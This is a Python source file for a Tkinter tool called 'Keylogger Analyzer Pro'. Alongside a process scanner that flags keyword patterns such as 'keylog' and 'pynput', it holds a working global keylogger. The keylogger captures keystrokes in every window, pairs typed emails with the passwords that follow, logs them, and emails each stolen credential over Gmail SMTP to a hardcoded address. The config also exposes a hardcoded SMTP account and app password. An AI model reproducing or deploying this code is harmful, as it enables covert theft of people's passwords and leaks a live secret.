import os
import psutil
import time
import ctypes
import smtplib
import tkinter as tk
from tkinter import ttk, messagebox
from threading import Thread, Lock
from pynput import keyboard
import json
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import ttkbootstrap as tb

# --- Platform-specific import for getting window title ---
try:
    import win32gui
    IS_WINDOWS = True
except ImportError:
    IS_WINDOWS = False

# --- Configuration ---
CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
DEFAULT_CONFIG = {
    "scan_interval": 5,
    "suspicious_keywords": ["keylog", "pynput", "keyboard", "win32api", "hook", "pyhook"],
    "email_enabled": True,
    "recipient_email": "mohammad22cse@gmail.com",
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "smtp_user": "keylogger.pro.ver@gmail.com",
    "smtp_password": "xdyy zgkk lawh exuj"
}

class KeyloggerAnalyzerApp:
    def __init__(self, main_frame, root):
        self.main_frame = main_frame
        self.root = root
        self.root.title("Keylogger Analyzer Pro v2.0")
        self.root.geometry("1000x700")

        self.config = self.load_config()

        # --- App State ---
        self.monitoring_active = False
        self.keylogger_running = False
        self.listener = None
        self.monitor_thread = None
        self.log_file = "keylog_output.txt"
        self.log_lock = Lock()

        # --- Credential Detection State ---
        self.credential_patterns = {
            'Email': r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
            'Username': r"(?i)user(name)?\s*[:=]?\s*([a-zA-Z0-9_.-]{3,})",
            'Password': r"(?i)pass(word)?\s*[:=]?\s*([^\s]+)"
        }
        self.detected_credentials = []
        self.keystroke_buffers = {}
        self.last_window_title = ""

        # Password capture state
        self.partial_password = ""
        self.partial_pw_target = None
        self.partial_pw_window = None
        self.last_credential = None
        self.last_credential_window = None
        self.awaiting_password_for = None
        self.awaiting_password_window = None
        self.password_typing = False
        self.password_buffer = ""
        self.capture_next_char_as_password = False
        
        # Mouse click timing for field switching detection
        self.last_keystroke_time = 0
        self.last_click_time = 0
        self.last_email_time = 0
        self.email_detected = False  # Flag to track when email was just detected

        # --- UI Setup ---
        self.setup_styles()
        self.create_widgets()

        if not self.is_admin():
            messagebox.showwarning(
                "Admin Privileges Required",
                "For full functionality (like killing processes), please run as administrator."
            )

    def load_config(self):
        config_path = os.path.abspath(CONFIG_FILE)
        
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    return config
            except Exception as e:
                self.save_config(DEFAULT_CONFIG)
                return DEFAULT_CONFIG
        else:
            self.save_config(DEFAULT_CONFIG)
            return DEFAULT_CONFIG

    def save_config(self, config_data=None):
        data_to_save = config_data if config_data else self.config
        with open(CONFIG_FILE, 'w') as f:
            json.dump(data_to_save, f, indent=4)
        if not config_data:
            messagebox.showinfo("Success", "Configuration saved!")

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except AttributeError:
            return False

    def setup_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TNotebook", background="#fdfcfb", borderwidth=0)
        style.configure("TNotebook.Tab", background="#e2d1c3", foreground="#00FFFF", padding=[10, 5], borderwidth=0, font=("Helvetica", 13))
        style.map("TNotebook.Tab", background=[("selected", "#fdfcfb")], foreground=[("selected", "#00FFFF")])
        style.configure("TFrame", background="#fdfcfb", borderwidth=2, relief="solid")
        style.configure("TLabel", background="#fdfcfb", foreground="#00FF99", font=("Helvetica", 13))
        style.configure("TButton", background="#e2d1c3", foreground="#FFA500", borderwidth=0, relief="flat", font=("Helvetica", 13, "bold"))
        style.map("TButton", background=[('active', '#e2d1c3')], foreground=[('active', '#FFD700')])
        style.configure("Treeview", background="#fdfcfb", foreground="#00FF99", fieldbackground="#fdfcfb", rowheight=28, borderwidth=0, font=("Consolas", 13))
        style.configure("Treeview.Heading", background="#fdfcfb", foreground="#00FFFF", font=("Helvetica", 13, "bold"), borderwidth=0)
    # self.main_frame.configure(background="#fdfcfb")  # Removed, use bootstyle for frame background

    def create_widgets(self):
        self.tab_control = ttk.Notebook(self.main_frame)
        self.dashboard_tab = ttk.Frame(self.tab_control)
        self.keylogger_tab = ttk.Frame(self.tab_control)
        self.settings_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.dashboard_tab, text='🛡️ Detection Dashboard')
        self.tab_control.add(self.keylogger_tab, text='⌨️ Keylogger & Credentials')
        self.tab_control.add(self.settings_tab, text='⚙️ Settings')
        self.tab_control.pack(expand=1, fill='both', padx=10, pady=10)
        self.setup_dashboard_tab()
        self.setup_keylogger_tab()
        self.setup_settings_tab()

    def setup_dashboard_tab(self):
        frame = self.dashboard_tab
        self.tree = ttk.Treeview(frame, columns=("PID", "Name", "Executable", "CMD"), show='headings')
        self.tree.heading("PID", text="PID"); self.tree.heading("Name", text="Name"); self.tree.heading("Executable", text="Executable Path"); self.tree.heading("CMD", text="Command Line")
        self.tree.column("PID", width=80, anchor=tk.CENTER); self.tree.column("Name", width=150); self.tree.column("Executable", width=300); self.tree.column("CMD", width=300)
        self.tree.pack(pady=10, fill=tk.BOTH, expand=True)
        controls_frame = ttk.Frame(frame); controls_frame.pack(fill=tk.X, pady=5)
        self.start_monitor_btn = ttk.Button(controls_frame, text="Start Monitoring", command=self.toggle_monitoring); self.start_monitor_btn.pack(side=tk.LEFT, padx=5)
        self.kill_btn = ttk.Button(controls_frame, text="Kill Selected Process", command=self.kill_selected_process); self.kill_btn.pack(side=tk.LEFT, padx=5)
        self.status_label = ttk.Label(frame, text="Status: Idle", foreground="yellow", font=("Helvetica", 10)); self.status_label.pack(side=tk.BOTTOM, fill=tk.X)

    def setup_keylogger_tab(self):
        frame = self.keylogger_tab
        # Control buttons - always visible at bottom
        controls_frame = tb.Frame(frame, bootstyle="light")
        controls_frame.pack(side="bottom", fill="x", pady=5)
        self.klog_btn = tb.Button(controls_frame, text="Start Keylogger", command=self.toggle_keylogger, bootstyle="primary-outline")
        self.klog_btn.pack(side="left", padx=5)
        self.save_log_btn = tb.Button(controls_frame, text="Save Log to File", command=self.save_log, bootstyle="info-outline")
        self.save_log_btn.pack(side="left", padx=5)
        # Main content above buttons, use grid for proportional layout
        main_frame = tb.Frame(frame, bootstyle="light")
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        main_frame.rowconfigure(0, weight=1)
        main_frame.rowconfigure(1, weight=3)
        main_frame.columnconfigure(0, weight=1)
        # Log display
        log_frame = tb.Frame(main_frame, bootstyle="light")
        log_frame.grid(row=0, column=0, sticky="nsew")
        tb.Label(log_frame, text="Live Keystrokes Detected:", font=("Helvetica", 16, "bold"), bootstyle="light").pack(anchor="w", pady=(2,2))
        self.log_text = tb.Text(log_frame, bg="#fdfcfb", fg="#e78523", insertbackground="#00FFFF", relief="flat", borderwidth=10, highlightthickness=2, highlightbackground="#e2d1c3", wrap="word")
        self.log_text.pack(fill="both", expand=True)
        self.log_text.config(font=("Consolas", 15))
        self.log_text.config(state="disabled")  # Make read-only
        # Credential display
        cred_frame = tb.Frame(main_frame, bootstyle="light")
        cred_frame.grid(row=1, column=0, sticky="nsew")
        tb.Label(cred_frame, text="Smart Credential Capture :", font=("Helvetica", 16, "bold"), bootstyle="warning").pack(anchor="w", pady=(2,2))
        self.cred_list = tb.Text(cred_frame, bg="#fdfcfb", fg="#FFA500", insertbackground="#00FFFF", relief="flat", borderwidth=10, highlightthickness=2, highlightbackground="#e2d1c3", wrap="word")
        self.cred_list.pack(fill="both", expand=True)
        self.cred_list.config(font=("Consolas", 15))
        self.cred_list.config(state="disabled")  # Make read-only

    def setup_settings_tab(self):
        # Centered, larger settings UI
        frame = self.settings_tab
        self.settings_vars = {}

        container = ttk.Frame(frame)
        container.place(relx=0.5, rely=0.5, anchor="center")

        # Grid config
        for i in range(2):
            container.columnconfigure(i, weight=1)

        heading = ttk.Label(container, text="Application Settings", foreground="black", font=("Helvetica", 22, "bold"))
        heading.grid(row=0, column=0, columnspan=2, pady=(0, 25))

        ttk.Label(container, text="Scan Interval (sec):", foreground="black", font=("Helvetica", 16)).grid(row=1, column=0, padx=12, pady=10, sticky="e")
        self.settings_vars['scan_interval'] = tk.IntVar(value=self.config['scan_interval'])
        ttk.Entry(container, textvariable=self.settings_vars['scan_interval'], width=12).grid(row=1, column=1, padx=12, pady=10, sticky="w")

        email_heading = ttk.Label(container, text="Email Alerts", font=("Helvetica", 20, "bold"), foreground="black")
        email_heading.grid(row=2, column=0, columnspan=2, pady=(10, 15))

        self.settings_vars['email_enabled'] = tk.BooleanVar(value=self.config['email_enabled'])
        ttk.Checkbutton(container, text="Enable Email Notifications", variable=self.settings_vars['email_enabled']).grid(row=3, column=0, columnspan=2, pady=5)

        ttk.Label(container, text="Recipient Email:", foreground="black", font=("Helvetica", 16)).grid(row=4, column=0, padx=12, pady=10, sticky="e")
        self.settings_vars['recipient_email'] = tk.StringVar(value=self.config['recipient_email'])
        ttk.Entry(container, textvariable=self.settings_vars['recipient_email'], width=46).grid(row=4, column=1, padx=12, pady=10, sticky="w")



        ttk.Button(container, text="Save Configuration", command=self.apply_and_save_settings, style="TButton").grid(row=6, column=0, columnspan=2, pady=(28, 15))

        note = ("SMTP password stored in config.json (hidden).\nUse a 16-char Gmail App Password.")
        ttk.Label(container, text=note, wraplength=560, justify=tk.CENTER, foreground="black", font=("Helvetica", 14)).grid(row=7, column=0, columnspan=2, padx=10, pady=(5, 10))

    # --- Core Functionality ---

    def get_active_window_title(self):
        if IS_WINDOWS:
            try:
                return win32gui.GetWindowText(win32gui.GetForegroundWindow())
            except Exception:
                return "Unknown Window"
        else:
            return "Unknown Window (non-Windows OS)"

    # --- Keylogger Logic (REWRITTEN) ---
    def toggle_keylogger(self):
        if self.keylogger_running:
            self.keylogger_running = False
            if self.listener:
                self.listener.stop()
            self.listener = None
            if hasattr(self, 'mouse_listener') and self.mouse_listener:
                self.mouse_listener.stop()
                self.mouse_listener = None
            self.klog_btn.config(text="Start Keylogger")
            self.update_log_text("--- Keylogger stopped ---\n")
        else:
            self.keylogger_running = True
            self.keystroke_buffers = {}
            self.detected_credentials = []
            self.update_cred_list()
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            # Mouse listener disabled due to pynput crashes on some Windows systems
            # try:
            #     from pynput import mouse
            #     self.mouse_listener = mouse.Listener(on_click=self.on_mouse_click)
            #     self.mouse_listener.start()
            #     self.update_log_text("Mouse listener started successfully\n")
            # except Exception as e:
            #     self.update_log_text(f"Failed to start mouse listener: {e}\n")
            #     self.mouse_listener = None
            self.update_log_text("Mouse listener disabled - using auto-detection instead\n")
            self.mouse_listener = None
            self.klog_btn.config(text="Stop Keylogger")
            self.update_log_text(f"--- Keylogger started at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")

    def on_press(self, key):
        if not self.keylogger_running:
            return False  # Stops the listener thread
        # Process key immediately to avoid missing fast keystrokes
        self.process_key_press_immediate(key)

    def reset_password_mode(self):
        """Reset password capture mode completely"""
        self.password_typing = False
        self.password_buffer = ""
        self.awaiting_password_for = None
        self.awaiting_password_window = None

    def process_key_press_immediate(self, key):
        """
        Rewritten for zero-delay password capture.
        This function runs in the listener thread and must be extremely fast.
        """
        window_title = self.get_active_window_title()
        current_time = time.time()
        self.last_keystroke_time = current_time
        
        # Ignore the keylogger's own window
        if "Keylogger Analyzer Pro" in window_title:
            return

        print(f"KEY PRESSED: {key} in window: {window_title}")
        print(f"Password typing mode: {self.password_typing}")
        
        # --- A. Handle Regular Character Keys ---
        if not isinstance(key, keyboard.Key):
            try:
                key_name = key.char
                if key_name is None: return
            except AttributeError:
                return

            # PRIORITY 1: We are actively typing a password.
            if self.password_typing and self.awaiting_password_window == window_title:
                self.password_buffer += key_name
                print(f"PASSWORD CHAR: '{key_name}' -> Buffer: '{self.password_buffer}'")
                log_entry = f"[LIVE PASSWORD] '{self.password_buffer}'\n"
                self.root.after_idle(self.update_log_text, log_entry)
                return

            # PRIORITY 2: Regular keystroke - add to buffer and check for email completion
            if window_title not in self.keystroke_buffers:
                self.keystroke_buffers[window_title] = ""
            
            self.keystroke_buffers[window_title] += key_name
            buffer = self.keystroke_buffers[window_title]
            print(f"REGULAR CHAR: '{key_name}' -> Buffer: '{buffer}'")
            
            # Auto-detect email completion: if buffer contains complete email + extra chars, switch to password mode
            if '@' in buffer and '.' in buffer and not self.password_typing:
                # Look for email pattern
                import re
                email_match = re.search(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', buffer)
                if email_match:
                    email = email_match.group(0)
                    email_end_pos = buffer.find(email) + len(email)
                    text_after_email = buffer[email_end_pos:].strip()
                    
                    # If there's text after email, user started typing password
                    if text_after_email and len(text_after_email) >= 1:
                        print(f"EMAIL AUTO-DETECTED: {email}")
                        print(f"PASSWORD AUTO-STARTED: '{text_after_email}'")
                        
                        # Save email
                        self.commit_email(email)
                        
                        # Switch to password mode
                        self.keystroke_buffers[window_title] = ""
                        self.password_typing = True
                        self.password_buffer = text_after_email
                        self.awaiting_password_for = email
                        self.awaiting_password_window = window_title
                        
                        # Update GUI
                        self.root.after_idle(self.update_log_text, f"[AUTO-SWITCH] Email: {email}\n")
                        self.root.after_idle(self.update_log_text, f"[LIVE PASSWORD] '{self.password_buffer}'\n")
                        return
            
            # Real-time email detection logic
            buffer = self.keystroke_buffers[window_title]
            if key_name in '@.' and len(buffer) > 5:
                match = re.search(self.credential_patterns['Email'], buffer)
                if match:
                    email = match.group(0)
                    self.awaiting_password_for = email
                    self.awaiting_password_window = window_title
                    self.last_email_time = current_time  # Track when we detected the email
                    # CRITICAL: Set last_credential for password pairing
                    self.last_credential = email
                    self.last_credential_window = window_title
                    
                    # Store email in credentials list
                    if not any(cred['match'] == email for cred in self.detected_credentials):
                        self.detected_credentials.append({
                            "window": window_title,
                            "type": "Email",
                            "match": email,
                            "timestamp": time.strftime('%H:%M:%S'),
                            "confidence": "high"
                        })
                        self.update_cred_list()
                        self.send_credential_alert_email("Email", email, window_title)
                    
                    # Remove at symbol logic - we handle email detection in mouse clicks now
                    # Mark that we need to clear buffer after email is complete
                    self.email_detected = True
                    # DON'T clear buffer immediately - wait for email to finish typing

            log_entry = f"[{time.strftime('%H:%M:%S')}] '{key_name}' in {window_title}\n"
            self.root.after_idle(self.update_log_text, log_entry)
            return

        # --- B. Handle Special Keys ---
        
        # BACKSPACE
        elif key == keyboard.Key.backspace:
            if self.password_typing and self.awaiting_password_window == window_title and self.password_buffer:
                self.password_buffer = self.password_buffer[:-1]
                log_entry = f"[LIVE PASSWORD] '{self.password_buffer}'"
                self.root.after_idle(self.update_log_text, log_entry)
            elif window_title in self.keystroke_buffers and self.keystroke_buffers[window_title]:
                self.keystroke_buffers[window_title] = self.keystroke_buffers[window_title][:-1]
            return

        # TAB or ENTER (Field submission)
        elif key in [keyboard.Key.tab, keyboard.Key.enter]:
            # If we were typing a password, commit it.
            if self.password_typing and len(self.password_buffer.strip()) >= 3:
                self.commit_password(window_title)
                return

            # If we were NOT typing a password, check the buffer for an email/username.
            buffer = self.keystroke_buffers.get(window_title, "").strip()
            if buffer:
                match = re.search(self.credential_patterns['Email'], buffer)
                if match:
                    email = match.group(0)
                    self.awaiting_password_for = email
                    self.awaiting_password_window = window_title
                    self.last_email_time = current_time  # Track when we detected the email
                    # CRITICAL: Set last_credential for password pairing
                    self.last_credential = email
                    self.last_credential_window = window_title
                    
                    # Store email in credentials list if not already there
                    if not any(cred['match'] == email for cred in self.detected_credentials):
                        self.detected_credentials.append({
                            "window": window_title,
                            "type": "Email",
                            "match": email,
                            "timestamp": time.strftime('%H:%M:%S'),
                            "confidence": "high"
                        })
                        self.update_cred_list()
                        self.send_credential_alert_email("Email", email, window_title)
                    
                    # Clear buffer after detecting email - prepare for password input
                    self.keystroke_buffers[window_title] = ""
            return
            
        # SPACE
        elif key == keyboard.Key.space:
            if self.password_typing and self.awaiting_password_window == window_title:
                self.password_buffer += " "
            elif window_title in self.keystroke_buffers:
                self.keystroke_buffers[window_title] += " "
            log_entry = f"[{time.strftime('%H:%M:%S')}] [space] in {window_title}\n"
            self.root.after_idle(self.update_log_text, log_entry)
            return
        """This method runs in the main GUI thread, making it safe to update UI."""
        window_title = self.get_active_window_title()
        
        # Skip processing if this is the keylogger's own window
        if "Keylogger Analyzer Pro" in window_title:
            return

        # If window changed, commit any pending password and analyze the buffer
        if window_title != self.last_window_title and self.last_window_title:
            # Don't commit password if switching away from keylogger window back to login
            if not ("Keylogger Analyzer Pro" in self.last_window_title):
                # Only commit if we're in the same window where password was expected
                if (self.password_typing and len(self.password_buffer.strip()) >= 3 and 
                    self.awaiting_password_window == self.last_window_title):
                    self.commit_password(self.last_window_title)
                elif self.password_typing:
                    # Reset password capture if we're in a different window
                    self.password_typing = False
                    self.password_buffer = ""
                    self.awaiting_password_for = None
                    self.awaiting_password_window = None
                    
                buffer = self.keystroke_buffers.get(self.last_window_title, "")
                if buffer and not self.password_typing:
                    self.analyze_buffer_for_credentials(buffer, self.last_window_title)
        self.last_window_title = window_title

        # Initialize buffer for new window if not present
        if window_title not in self.keystroke_buffers:
            self.keystroke_buffers[window_title] = ""

    def on_mouse_click(self, x, y, button, pressed):
        """Ultra-simple mouse click handler"""
        # Print to console immediately - this should always work
        print(f"=== MOUSE CLICK: ({x}, {y}) pressed={pressed} ===")
        
        if not pressed:
            return
            
        print(f"MOUSE BUTTON PRESSED AT ({x}, {y})")
        
        try:
            window_title = self.get_active_window_title()
            print(f"Window: {window_title}")
            
            # Skip keylogger window
            if "Keylogger Analyzer Pro" in window_title:
                print("Skipping keylogger window")
                return

            # Get buffer
            buffer = self.keystroke_buffers.get(window_title, "").strip()
            print(f"Current buffer: '{buffer}'")
            
            # If buffer has @ symbol, treat it as email and switch to password mode
            if buffer and '@' in buffer:
                print(f"EMAIL DETECTED: {buffer}")
                print("SWITCHING TO PASSWORD MODE")
                
                # Save email
                self.commit_email(buffer)
                
                # Clear buffer and activate password mode
                self.keystroke_buffers[window_title] = ""
                self.password_typing = True
                self.password_buffer = ""
                self.awaiting_password_for = buffer
                self.awaiting_password_window = window_title
                
                # Log to GUI
                self.root.after_idle(self.update_log_text, f"[MOUSE CLICK] Email detected: {buffer}\n")
                self.root.after_idle(self.update_log_text, f"[MOUSE CLICK] Password mode activated\n")
            else:
                print(f"No email in buffer: '{buffer}'")
                
        except Exception as e:
            print(f"Mouse click error: {e}")
            import traceback
            traceback.print_exc()

    def analyze_buffer_for_credentials(self, buffer, window_title):
        if not buffer.strip():
            return
        # If actively typing password, defer analysis (password committed separately)
        if self.password_typing:
            return
        found_new = False
        # 1. UI context: Only capture in login/auth windows
        login_keywords = ["login", "sign in", "authentication", "auth", "password", "secure", "account"]
        signup_keywords = ["sign up", "register", "create account", "new user"]
        window_title_lower = window_title.lower()
        if any(word in window_title_lower for word in signup_keywords):
            return  # Ignore sign-up/registration windows
        confidence = "low"
        if any(word in window_title_lower for word in login_keywords):
            confidence = "high"
        
        # 2. Check for email and split buffer if needed
        email_matches = list(re.finditer(self.credential_patterns['Email'], buffer, re.IGNORECASE))
        username_matches = list(re.finditer(self.credential_patterns['Username'], buffer, re.IGNORECASE))
        
        if email_matches:
            # Get the last email match
            last_email_match = email_matches[-1]
            email = last_email_match.group(0)
            
            # Check if there's text after the email that could be a password
            email_end_pos = last_email_match.end()
            remaining_text = buffer[email_end_pos:].strip()
            
            # Store email as credential (clean email only)
            self.last_credential = email
            self.last_credential_window = window_title
            if not any(cred['match'] == email for cred in self.detected_credentials):
                        self.detected_credentials.append({
                            "window": window_title,
                            "type": "Email",
                            "match": email,
                            "timestamp": time.strftime('%H:%M:%S'),
                            "confidence": confidence
                        })
                        found_new = True
                        # Send email alert for credential detection
                        if self.config.get("email_enabled"):
                            self.send_credential_alert_email("Email", email, window_title)
            # Reset any partial password accumulation when a new credential identifier appears
            self.partial_password = ""
            self.partial_pw_target = email
            self.partial_pw_window = window_title
            # Mark that next submitted buffer likely contains the password
            self.awaiting_password_for = email
            self.awaiting_password_window = window_title
            
            # If there's remaining text, treat it as password
            if remaining_text:
                # Always defer commit for inline remainder after email to avoid premature password capture
                # Store as partial (even if it looks complex) and wait for next field submission (Tab/Enter/window change)
                self.partial_password = remaining_text
                self.partial_pw_target = email
                self.partial_pw_window = window_title
                        
        elif username_matches:
            # Similar logic for username
            last_username_match = username_matches[-1]
            username = last_username_match.group(0)
            
            self.last_credential = username
            self.last_credential_window = window_title
            if not any(cred['match'] == username for cred in self.detected_credentials):
                self.detected_credentials.append({
                    "window": window_title,
                    "type": "Username",
                    "match": username,
                    "timestamp": time.strftime('%H:%M:%S'),
                    "confidence": confidence
                })
                found_new = True
            # Reset partial password accumulation
            self.partial_password = ""
            self.partial_pw_target = username
            self.partial_pw_window = window_title
            self.awaiting_password_for = username
            self.awaiting_password_window = window_title
            
            # Check for password after username
            username_end_pos = last_username_match.end()
            remaining_text = buffer[username_end_pos:].strip()
            if remaining_text:
                # Defer commit for inline remainder after username just like email
                self.partial_password = remaining_text
                self.partial_pw_target = username
                self.partial_pw_window = window_title
        else:
            # Previous password heuristic path removed in favor of explicit password_typing state.
            pass
        # 4. Clipboard/paste detection: If buffer contains paste marker, treat as password
        if hasattr(self, 'last_clipboard') and self.last_clipboard:
            clipboard_pw = self.last_clipboard.strip()
            if (len(clipboard_pw) >= 6 and
                sum(bool(re.search(pattern, clipboard_pw)) for pattern in [r'[A-Z]', r'[a-z]', r'[0-9]', r'[^A-Za-z0-9]']) >= 2 and
                not any(cred['match'] == clipboard_pw for cred in self.detected_credentials)):
                self.detected_credentials.append({
                    "window": window_title,
                    "type": f"Password (pasted for {self.last_credential})",
                    "match": clipboard_pw,
                    "timestamp": time.strftime('%H:%M:%S'),
                    "confidence": confidence
                })
                found_new = True
            self.last_clipboard = None  # Reset after use
        # 5. Only run identifier patterns for email/username
        for cred_type, pattern in self.credential_patterns.items():
            if cred_type == 'Password':
                continue  # skip password pattern here
            for match in re.finditer(pattern, buffer, re.IGNORECASE):
                match_text = match.group(2) if match.groups() else match.group(0)
                if not any(cred['match'] == match_text for cred in self.detected_credentials):
                    self.detected_credentials.append({
                        "window": window_title,
                        "type": cred_type,
                        "match": match_text,
                        "timestamp": time.strftime('%H:%M:%S'),
                        "confidence": confidence
                    })
                    found_new = True
        if found_new:
            self.update_cred_list()

    def commit_email(self, email):
        """Commit an email to the credentials list"""
        if not email or len(email) < 5 or '@' not in email:
            return
            
        # Add to detected credentials if not already there
        if not any(cred['match'] == email for cred in self.detected_credentials):
            self.detected_credentials.append({
                "window": self.get_active_window_title(),
                "type": "Email",
                "match": email,
                "timestamp": time.strftime('%H:%M:%S'),
                "confidence": "high"
            })
            self.update_cred_list()
            self.send_credential_alert_email("Email", email, self.get_active_window_title())
            self.root.after_idle(self.update_log_text, f"[EMAIL SAVED] {email}\n")

    def commit_password(self, window_title):
        """Commit the accumulated password when user submits (Enter/Tab) or window changes."""
        if not self.password_typing:
            return
            
        candidate = self.password_buffer.strip()
        
        # Only commit if we have a substantial password and it's not an email
        if (self.last_credential and len(candidate) >= 3 and
            not re.fullmatch(self.credential_patterns['Email'], candidate, re.IGNORECASE) and
            candidate != self.last_credential):  # Don't commit if password is same as credential
            # Store password
            self.detected_credentials.append({
                "window": window_title,
                "type": f"Password (for {self.last_credential})",
                "match": candidate,
                "timestamp": time.strftime('%H:%M:%S'),
                "confidence": "high"
            })
            self.update_cred_list()
            
            if self.config.get("email_enabled"):
                try:
                    self.send_credential_alert_email("Password", candidate, window_title, self.last_credential)
                except Exception as e:
                    print(f"[ERROR] Failed to send credential alert email (non-blocking): {e}")
            
        if len(candidate) == 0:
            return  # Don't reset states if no password was entered
            
        # Reset states after committing password
        self.password_typing = False
        self.password_buffer = ""
        self.awaiting_password_for = None
        self.awaiting_password_window = None
        self.partial_password = ""
        self.partial_pw_target = None
        self.partial_pw_window = None
        self.last_credential = None
        self.last_credential_window = None

    def update_cred_list(self):
        self.cred_list.config(state="normal")
        self.cred_list.delete("1.0", tk.END)
        for cred in self.detected_credentials:
            line = f"[{cred['timestamp']}] [{cred['type']}] [{cred['window']}]\n  > {cred['match']}\n"
            self.cred_list.insert(tk.END, line)
        self.cred_list.config(state="disabled")

    def update_log_text(self, text):
        self.log_text.config(state="normal")
        self.log_text.insert(tk.END, text)
        self.log_text.see(tk.END)
        self.log_text.config(state="disabled")
        with self.log_lock:
            with open(self.log_file, "a", encoding='utf-8') as f:
                f.write(text)

    def save_log(self):
        content = self.log_text.get("1.0", tk.END);
        if not content.strip(): messagebox.showwarning("Empty Log", "There is nothing to save."); return
        file_path = f"keylog_saved_{time.strftime('%Y%m%d_%H%M%S')}.txt";
        with open(file_path, "w", encoding='utf-8') as f: f.write(content)
        messagebox.showinfo("Success", f"Log saved successfully to {file_path}")

    # --- Process Monitoring Methods (Unchanged) ---
    def toggle_monitoring(self):
        if not self.monitoring_active: self.monitoring_active = True; self.start_monitor_btn.config(text="Stop Monitoring"); self.monitor_thread = Thread(target=self.monitor_processes, daemon=True); self.monitor_thread.start()
        else: self.monitoring_active = False; self.start_monitor_btn.config(text="Start Monitoring"); self.status_label.config(text="Status: Monitoring stopped.", foreground="yellow")
    def monitor_processes(self):
        while self.monitoring_active:
            self.status_label.config(text="Status: Scanning for suspicious processes...", foreground="cyan"); suspicious = self.scan_processes(); self.root.after(0, self.update_tree, suspicious)
            # Removed email alert for process monitoring - only credential alerts are sent
            self.root.after(0, lambda: self.status_label.config(text=f"Last scan: {time.strftime('%H:%M:%S')} | Detected: {len(suspicious)}", foreground="red" if suspicious else "lightgreen")); time.sleep(self.config["scan_interval"])
    def scan_processes(self):
        suspicious_processes = [];
        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
            try:
                proc_info = proc.info; cmdline = proc_info.get("cmdline") or []; full_cmd = " ".join(cmdline); combined_info = (proc_info.get("name") or "") + " " + full_cmd
                for keyword in self.config["suspicious_keywords"]:
                    if keyword.lower() in combined_info.lower(): suspicious_processes.append(proc_info); break
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess): continue
        return suspicious_processes
    def update_tree(self, processes):
        self.tree.delete(*self.tree.get_children());
        for proc in processes: self.tree.insert("", "end", values=(proc.get("pid", ""), proc.get("name", ""), proc.get("exe", ""), " ".join(proc.get("cmdline") or [])))
    def kill_selected_process(self):
        selected_items = self.tree.selection()
        if not selected_items: messagebox.showwarning("No Selection", "Please select a process to kill."); return
        if not self.is_admin(): messagebox.showerror("Permission Denied", "Administrator rights are required."); return
        for item in selected_items:
            pid = self.tree.item(item, "values")[0]
            try: p = psutil.Process(int(pid)); p.terminate(); self.tree.delete(item); self.status_label.config(text=f"Success: Process {pid} terminated.", foreground="lightgreen")
            except Exception as e: messagebox.showerror("Error", f"Could not terminate process {pid}: {e}"); self.status_label.config(text=f"Error: Could not terminate process {pid}.", foreground="red")
    def apply_and_save_settings(self):
        for key, var in self.settings_vars.items(): self.config[key] = var.get()
        self.save_config()
    def send_credential_alert_email(self, cred_type, credential, window_title, associated_email=None):
        if not self.config.get('email_enabled'):
            return
        
        subject = f"CREDENTIAL ALERT: {cred_type} Detected on {os.environ.get('COMPUTERNAME', 'Unknown PC')}"
        
        if cred_type == "Password" and associated_email:
            body_html = f"""
            <h2>Password Detected</h2>
            <p><strong>Timestamp:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>Window/Website:</strong> {window_title}</p>
            <p><strong>Email:</strong> {associated_email}</p>
            <p><strong>Password:</strong> {credential}</p>
            <p><strong>PC:</strong> {os.environ.get('COMPUTERNAME', 'Unknown PC')}</p>
            """
        else:
            body_html = f"""
            <h2>{cred_type} Detected</h2>
            <p><strong>Timestamp:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>Window/Website:</strong> {window_title}</p>
            <p><strong>{cred_type}:</strong> {credential}</p>
            <p><strong>PC:</strong> {os.environ.get('COMPUTERNAME', 'Unknown PC')}</p>
            """
        
        msg = MIMEMultipart()
        msg['From'] = self.config['smtp_user']
        msg['To'] = self.config['recipient_email']
        msg['Subject'] = subject
        msg.attach(MIMEText(body_html, 'html'))
        
        try:
            with smtplib.SMTP(self.config['smtp_server'], self.config['smtp_port']) as server:
                server.starttls()
                # Clean password - remove spaces from Gmail App Password
                clean_password = self.config['smtp_password'].replace(' ', '')
                print(f"[EMAIL DEBUG] Using cleaned password (length: {len(clean_password)})")
                print(f"[EMAIL DEBUG] Original had spaces: {' ' in self.config['smtp_password']}")
                
                # Validate App Password format
                if len(clean_password) != 16:
                    print(f"🚨 INVALID APP PASSWORD LENGTH: {len(clean_password)} (should be 16)")
                    print(f"🚨 Current password: '{self.config['smtp_password']}'")
                    print(f"🚨 Clean password: '{clean_password}'")
                    print("🔧 Generate new App Password at: https://myaccount.google.com/apppasswords")
                    return
                else:
                    print(f"✅ App Password format is correct (16 characters)")
                
                server.login(self.config['smtp_user'], clean_password)
                server.send_message(msg)
            print(f"✅ Credential alert email sent: {cred_type} - {credential}")
        except Exception as e:
            print(f"❌ Failed to send credential alert email: {e}")
            # Additional debug info
            if "535" in str(e):
                print("🔧 Gmail authentication failed - App Password needs regeneration")
                print("   Go to: https://myaccount.google.com/apppasswords")
                print("   Generate new password and update config.json")
            elif "587" in str(e):
                print("🔧 SMTP connection failed - check network")
            elif "timeout" in str(e).lower():
                print("🔧 Network timeout - check internet connection")
            else:
                print(f"🔧 Email error details: {type(e).__name__} - {e}")
            
            # Store credentials locally even if email fails
            print(f"📝 Credential stored locally: {cred_type} = {credential}")

    def send_alert_email(self, processes):
        if not self.config.get('email_enabled'): return
